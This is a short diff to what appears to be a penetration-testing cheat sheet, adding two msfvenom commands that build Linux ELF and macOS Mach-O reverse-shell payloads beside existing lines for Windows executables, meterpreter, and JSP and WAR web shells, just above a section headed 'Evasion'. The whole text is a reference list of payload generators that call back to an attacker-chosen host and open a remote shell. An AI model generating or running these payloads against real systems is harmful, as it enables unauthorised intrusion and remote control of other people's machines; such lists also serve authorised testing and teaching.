@@ -1317,6 +1317,8 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw > shell.jsp
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f elf > shell.elf
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f macho > shell.macho	
 ```
 
 #10. - Evasion
